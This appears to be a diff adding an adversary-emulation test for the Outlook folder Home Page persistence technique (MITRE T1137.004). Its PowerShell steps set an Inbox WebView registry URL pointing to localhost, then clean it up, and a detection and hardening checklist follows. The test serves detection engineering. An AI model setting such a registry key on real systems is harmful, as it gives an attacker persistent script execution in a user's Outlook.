@@ -1,0 +1,85 @@
+id: T1137.004_office_startup_outlook_home_page
+name: "Office Application Startup — Outlook Home Page"
+mitre_technique: "T1137.004"
+mitre_tactic: "persistence"
+description: >
+  Adversaries abuse the Outlook folder Home Page feature to load a malicious HTML page
+  whenever a specific folder (e.g. Inbox) is opened. The Home Page URL is stored in
+  the mailbox and in the registry. When Outlook opens the folder, it renders the
+  Home Page URL in an embedded browser, executing any HTML/JavaScript/ActiveX.
+  This is a legacy feature (disabled in newer Outlook versions by default) but
+  remains a vector in environments that have not applied the relevant patches.
+  Registry path: HKCU\Software\Microsoft\Office\<version>\Outlook\WebView\Inbox
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1137/004/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1137.004 — Outlook Home Page persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Check for existing Outlook WebView/Home Page registry entries"
+    command: |
+      Write-Host "[PAS] Outlook Home Page registry check:"
+      $versions = @("16.0","15.0","14.0")
+      foreach ($v in $versions) {
+          $webviewKey = "HKCU:\Software\Microsoft\Office\$v\Outlook\WebView"
+          if (Test-Path $webviewKey) {
+              Get-ChildItem $webviewKey -ErrorAction SilentlyContinue | ForEach-Object {
+                  $url = (Get-ItemProperty $_.PSPath -Name URL -ErrorAction SilentlyContinue).URL
+                  Write-Host "  Office $v - $($_.PSChildName): $url"
+              }
+          }
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Set malicious Outlook Home Page URL — triggers on Inbox open"
+    command: |
+      $outlookKey = "HKCU:\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox"
+      New-Item -Path $outlookKey -Force | Out-Null
+      Set-ItemProperty $outlookKey -Name "URL" `
+          -Value "http://127.0.0.1/PAS_T1137_004_homePage.html"
+      Set-ItemProperty $outlookKey -Name "Show" -Value 1 -Type DWord
+
+      Write-Host "[PAS] Outlook Home Page set: Inbox -> http://127.0.0.1/PAS_T1137_004_homePage.html"
+      Write-Host "[PAS] Next Inbox open renders this URL in embedded browser"
+      Write-Host "[PAS] Any JS/ActiveX in the page executes in Outlook's context"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HKCU\\...\\Outlook\\WebView registry key modified with URL value"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove Outlook Home Page registry entry"
+    command: |
+      Remove-Item "HKCU:\Software\Microsoft\Office\16.0\Outlook\WebView\Inbox" `
+          -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Outlook Home Page registry entry removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1137.004 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: HKCU\\...\\Outlook\\WebView URL value set"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Outlook\\\\WebView' and RegistryValueName == 'URL'"
+  - "MDE alert: 'Outlook folder Home Page set to external URL'"
+  - "CONTROL CHECK: Apply KB3191897 / KB4011162 patches — disables Home Page feature in Outlook"
+  - "CONTROL CHECK: GPO: DisableHomePage = 1 under Outlook policy settings"
+  - "CONTROL CHECK: Any WebView URL value should be treated as malicious on patched systems"
